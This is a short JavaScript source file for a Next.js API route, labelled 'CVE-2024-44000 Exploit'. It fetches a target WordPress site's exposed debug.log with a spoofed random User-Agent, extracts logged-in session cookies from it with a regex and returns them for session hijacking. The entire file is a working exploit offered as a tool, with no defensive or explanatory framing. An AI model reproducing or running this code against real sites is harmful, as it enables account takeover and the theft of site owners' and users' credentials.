import getUA, { getRandomUserAgent } from "@/utils/getUA";
import { NextResponse } from "next/server";

async function extractCookies(logContent) {
  const cookieRegex = /Cookie: (.*)/g;
  const cookies = [];
  let match;

  while ((match = cookieRegex.exec(logContent)) !== null) {
    cookies.push(match[1]);
  }
  return cookies;
}

async function extractSessionCookies(cookies) {
  return cookies.filter((cookie) => /wordpress_logged_in_[^=]+=[^;]+/.test(cookie) && !cookie.includes("=%20"));
}

export async function POST(request) {
  const { target } = await request.json();
  let error = false;
  let message = "";
  let status = 200;

  if (!target) {
    error = true;
    message = "All fields are required.";
    status = 400;
  }
  if (error) {
    return NextResponse.json(
      {
        success: false,
        error: message,
      },
      { status }
    );
  }

  const logUrl = target.startsWith("https://") || target.startsWith("http://") ? `${target}/wp-content/debug.log` : `http://${target}/wp-content/debug.log`;

  const response = await fetch(logUrl, { method: "GET", headers: { "User-Agent": getRandomUserAgent(getUA()) }, redirect: "manual", timeout: 10000 });

  if (response.status === 200) {
    const logContent = await response.text();
    const cookies = await extractCookies(logContent);
    const sessionCookies = await extractSessionCookies(cookies);

    if (sessionCookies.length > 0) {
      let cookie = "";
      for (const adminCookies of sessionCookies) {
        const cleanCookie = adminCookies.split(";")[0];
        const [cookieName, cookieValue] = cleanCookie.split("=");
        if (cookieValue !== "%20") {
          cookie += `${cookieName}=${cookieValue}\n`;
        }
      }

      return NextResponse.json(
        {
          success: true,
          message: `Session found ${target}`,
          totalData: cookie.trim().split("\n").length,
          data: cookie.trim().split("\n"),
        },
        { status: 200 }
      );
    } else {
      return NextResponse.json(
        {
          success: false,
          error: "Session not found",
        },
        { status: 404 }
      );
    }
  } else {
    return NextResponse.json(
      {
        success: false,
        error: "Failed to access target",
      },
      { status: 500 }
    );
  }
}

export async function GET() {
  return NextResponse.json({ tools: "CVE-2024-44000 Exploit" }, { status: 200 });
}
